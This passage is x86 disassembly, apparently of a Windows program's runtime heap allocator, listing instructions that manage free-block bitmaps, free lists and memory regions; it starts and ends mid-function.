  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
